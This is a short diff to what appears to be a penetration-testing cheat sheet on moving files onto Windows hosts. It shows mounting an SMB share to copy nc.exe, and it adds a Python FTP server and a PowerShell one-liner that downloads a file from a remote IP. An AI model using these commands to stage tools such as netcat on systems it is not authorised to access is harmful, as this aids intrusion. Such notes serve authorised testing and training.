@@ -32,3 +32,11 @@ Create the SMB Server with a Username and Password
 Mount the SMB Server with Username and Password  
 `net use n: \\192.168.220.133\share /user:test test`  
 `copy n:\nc.exe`
+
+# With FTP
+
+Setting up a Python3 FTP Server  
+`python3 -m pyftpdlib --port 21`
+
+Transfering Files from an FTP Server Using PowerShell  
+`(New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')`
